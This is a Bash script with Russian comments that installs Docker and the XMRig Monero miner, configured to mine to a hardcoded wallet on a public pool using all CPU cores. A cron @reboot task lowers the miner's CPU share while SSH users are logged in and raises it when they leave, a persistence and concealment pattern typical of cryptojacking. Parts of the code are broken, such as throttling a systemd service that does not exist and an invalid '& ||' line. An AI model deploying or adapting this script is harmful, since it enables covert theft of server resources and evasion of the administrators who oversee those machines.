#!/bin/bash

# Функция для вывода сообщения об ошибке и завершения скрипта
error_exit() {
    echo -e "\033[31m$1\033[0m"
    exit 1
}

set -o errexit  # Завершение скрипта при ошибке
set -o nounset  # Завершение скрипта при использовании несуществующих переменных

# Определение дистрибутива и менеджера пакетов
OS=""
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
fi

install_packages() {
    case "$OS" in
        ubuntu|debian)
            sudo apt-get update
            sudo apt-get install -y wget tar msr-tools docker-ce docker-compose
            ;;
        centos|rhel|almalinux|rocky)
            sudo yum update -y
            sudo yum install -y wget tar msr-tools
            sudo yum install -y yum-utils
            sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
            sudo yum install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
            ;;
        fedora)
            sudo dnf update -y
            sudo dnf install -y wget tar msr-tools
            sudo dnf install -y dnf-plugins-core
            sudo dnf config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo
            sudo dnf install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
            ;;
        arch)
            sudo pacman -Syu --noconfirm
            sudo pacman -S --noconfirm wget tar msr-tools docker docker-compose
            ;;
        *)
            error_exit "Unsupported OS: $OS"
            ;;
    esac
}

# Задаем переменные
XMRIG_VERSION="6.20.0"
XMRIG_DIR="/etc/xmrig"
XMRIG_BIN="$XMRIG_DIR/xmrig"
POOL="pool.supportxmr.com:3333"
WALLET="467i7PYq63KSkgCq8TyuWpRyruY8fipyu9hnBgvCPCMXhLmT1Nepb3p2grsi12aHEg9Fosn4YypzdH3LMFZ1EjQWS8MtkPJ"
CONFIG_FILE="$XMRIG_DIR/config.json"
NUM_WORKERS=8
DOCKERFILE_PATH="/tmp/Dockerfile"

# Определение количества ядер
NUM_CORES=$(nproc)

# Установка необходимых пакетов
echo "Установка необходимых пакетов..."
install_packages

# Проверка поддержки MSR
echo "Проверка поддержки MSR..."
if ! lsmod | grep -q msr; then
    echo -e "\033[34mMSR не поддерживается или не загружен в текущей системе.\033[0m"
else
    sudo modprobe msr
    echo "MSR установлен и загружен."
fi

# Установка Docker
echo "Установка и запуск Docker..."
sudo systemctl start docker
sudo systemctl enable docker
sudo docker --version || error_exit "Не удалось установить Docker."

# Установка Docker Compose
echo "Установка Docker Compose..."
if ! command -v docker-compose &> /dev/null; then
    sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
    sudo chmod +x /usr/local/bin/docker-compose
fi
docker-compose --version || error_exit "Не удалось установить Docker Compose."

# Создание Dockerfile для XMRig
echo "Создание Dockerfile..."
cat <<EOF | sudo tee $DOCKERFILE_PATH
FROM ubuntu:20.04

# Установка зависимостей
RUN apt-get update && apt-get install -y wget tar

# Создание каталога для XMRig
RUN mkdir -p /etc/xmrig

# Запуск XMRig
CMD ["/etc/xmrig/xmrig", "--config", "/etc/xmrig/config.json"]
EOF

# Создание конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
sudo mkdir -p /etc/xmrig
cat <<EOF | sudo tee $CONFIG_FILE
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "threads": $NUM_CORES
  },
  "pools": [
    $(for i in $(seq 1 $NUM_WORKERS); do
        echo -n "{
          \"url\": \"$POOL\",
          \"user\": \"$WALLET.worker$i\",
          \"pass\": \"x\",
          \"coin\": \"monero\"
        }"
        [[ $i -lt $NUM_WORKERS ]] && echo -n ","
      done)
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOF

# Загрузка и установка XMRig
echo "Загрузка XMRig..."
wget "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz" -O /tmp/xmrig.tar.gz
sudo tar -xzf /tmp/xmrig.tar.gz -C /etc/xmrig
sudo chmod +x /etc/xmrig/xmrig

# Построение Docker-образа
echo "Построение Docker-образа для XMRig..."
sudo docker build -t xmrig-image -f $DOCKERFILE_PATH /tmp || error_exit "Не удалось построить Docker-образ для XMRig."

# Запуск контейнера XMRig
echo "Запуск контейнера XMRig..."
sudo docker run -d --name xmrig-container -v /etc/xmrig:/etc/xmrig xmrig-image || error_exit "Не удалось запустить контейнер XMRig."

# Проверка состояния контейнера
echo "Проверка состояния контейнера..."
sudo docker ps -a

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
echo "Создание скрипта управления XMRig..."
cat <<EOF | sudo tee /usr/local/bin/xmrig_control.sh
#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c "ssh")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done
EOF

# Делаем скрипт исполняемым
sudo chmod +x /usr/local/bin/xmrig_control.sh

# Добавление скрипта в автозагрузку через crontab
(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/xmrig_control.sh") | crontab -

# Запуск скрипта управления XMRig
/usr/local/bin/xmrig_control.sh & || error_exit "Не удалось запустить скрипт управления XMRig."

echo "Установка и настройка завершены."
